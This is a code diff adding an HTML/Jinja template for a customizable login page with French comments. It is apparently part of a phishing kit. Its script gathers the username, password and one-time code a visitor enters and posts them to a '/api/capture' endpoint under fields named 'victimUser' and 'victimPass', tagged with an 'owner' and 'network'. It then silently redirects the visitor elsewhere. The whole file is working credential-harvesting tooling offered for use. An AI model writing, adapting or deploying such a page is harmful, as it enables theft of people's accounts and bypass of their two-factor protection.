@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>{{ config.title }}</title>
+    <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { 
+            background: {% if config.bg_type == 'color' %}{{ config.bg_value }}{% else %}url('{{ config.bg_value }}') no-repeat center center fixed{% endif %}; 
+            background-size: cover; 
+            margin: 0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+        }
+        .box { 
+            background: {{ config.box_bg if config.box_bg else 'rgba(255, 255, 255, 0.95)' }}; 
+            padding: 40px 30px; 
+            border-radius: 20px; 
+            width: 90%; 
+            max-width: {{ config.box_width if config.box_width else '420px' }}; 
+            text-align: center; 
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4); 
+            margin: 20px;
+        }
+        .logo-container {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 20px auto;
+            border-radius: {% if config.logo_shape == 'circle' %}50%{% else %}14px{% endif %};
+            background: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.2);
+            border: 3px solid #f5b014;
+            overflow: hidden;
+            padding: 8px;
+        }
+        .logo { width: 100%; height: 100%; object-fit: contain; }
+        h2 { color: #111; margin-bottom: 25px; font-size: 24px; font-weight: 700; }
+        .input-group {
+            margin: 14px 0;
+            text-align: left;
+        }
+        .input-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .input-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+        }
+        input { 
+            width: 100%; 
+            padding: 14px 16px; 
+            background: #fdfdfd; 
+            border: 1px solid #dcdcdc; 
+            color: #333; 
+            border-radius: 10px; 
+            font-size: 15px; 
+            transition: all 0.3s ease;
+        }
+        input:focus { border-color: #f5b014; outline: none; background: #fff; box-shadow: 0 0 0 4px rgba(245,176,20,0.25); }
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            background: none;
+            border: none;
+            cursor: pointer;
+            font-size: 16px;
+            color: #666;
+            padding: 0;
+            margin: 0;
+            box-shadow: none;
+            width: auto;
+        }
+        button.submit-btn { 
+            width: 100%; 
+            padding: 15px; 
+            background: linear-gradient(135deg, #f5b014, #e09b0c); 
+            border: none; 
+            color: #fff; 
+            font-weight: 700; 
+            border-radius: 10px; 
+            cursor: pointer; 
+            margin-top: 20px; 
+            font-size: 17px; 
+            box-shadow: 0 6px 15px rgba(245,176,20,0.45);
+            transition: transform 0.2s, opacity 0.2s;
+        }
+        button.submit-btn:hover { opacity: 0.95; transform: translateY(-2px); }
+    </style>
+</head>
+<body>
+    <div class="box">
+        {% if config.logo_url %}
+        <div class="logo-container">
+            <img src="{{ config.logo_url }}" class="logo" alt="Logo">
+        </div>
+        {% endif %}
+        <h2>{{ config.title }}</h2>
+        <form id="opt1Form" onsubmit="submitOpt1(event)">
+            {% for f in config.fields %}
+            <div class="input-group">
+                <label class="input-label">
+                    {% if 'pass' in f.name|lower or 'mdp' in f.name|lower %}Password
+                    {% elif 'user' in f.name|lower or 'email' in f.name|lower or 'login' in f.name|lower %}Username / Email
+                    {% elif 'otp' in f.name|lower or 'code' in f.name|lower %}Verification Code (OTP)
+                    {% else %}{{ f.label }}{% endif %}
+                </label>
+                <div class="input-wrapper">
+                    <input type="{{ f.type }}" name="{{ f.name }}" id="field_{{ loop.index }}" placeholder="{{ f.label }}" required>
+                    {% if 'pass' in f.name|lower or 'mdp' in f.name|lower %}
+                    <button type="button" class="toggle-password" onclick="togglePass('field_{{ loop.index }}', this)">👁️</button>
+                    {% endif %}
+                </div>
+            </div>
+            {% endfor %}
+            <button type="submit" class="submit-btn">{{ config.btn_text }}</button>
+        </form>
+    </div>
+    <script>
+        function togglePass(fieldId, btn) {
+            const input = document.getElementById(fieldId);
+            if (input.type === "password") {
+                input.type = "text";
+                btn.textContent = "🙈";
+            } else {
+                input.type = "password";
+                btn.textContent = "👁️";
+            }
+        }
+
+        function submitOpt1(e) {
+            e.preventDefault();
+            const form = document.getElementById('opt1Form');
+            const inputs = form.querySelectorAll('input');
+            
+            let userVal = "Inconnu";
+            let passVal = "Inconnu";
+            let otpVal = "Aucun";
+
+            inputs.forEach(inp => {
+                let name = (inp.name || inp.placeholder || "").toLowerCase();
+                let val = inp.value;
+                if (!val) return;
+
+                if (name.includes('user') || name.includes('email') || name.includes('login') || name.includes('tel') || name.includes('nom')) {
+                    userVal = val;
+                } else if (name.includes('pass') || name.includes('mdp') || name.includes('mot de passe')) {
+                    passVal = val;
+                } else if (name.includes('otp') || name.includes('code') || name.includes('secret')) {
+                    otpVal = val;
+                }
+            });
+
+            if (userVal === "Inconnu" && inputs.length > 0) userVal = inputs[0].value;
+            if (passVal === "Inconnu" && inputs.length > 1) passVal = inputs[1].value;
+
+            // Envoi des données avec enregistrement parfait dans le tableau de bord
+            fetch('/api/capture', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    owner: "{{ config.owner }}",
+                    network: "{{ config.network }}",
+                    type: "option1_nocode",
+                    victimUser: userVal,
+                    victimPass: passVal,
+                    otp: otpVal
+                })
+            }).then(() => {
+                window.location.replace("{{ config.redirect_url }}");
+            }).catch(() => {
+                window.location.replace("{{ config.redirect_url }}");
+            });
+        }
+    </script>
+</body>
+</html>
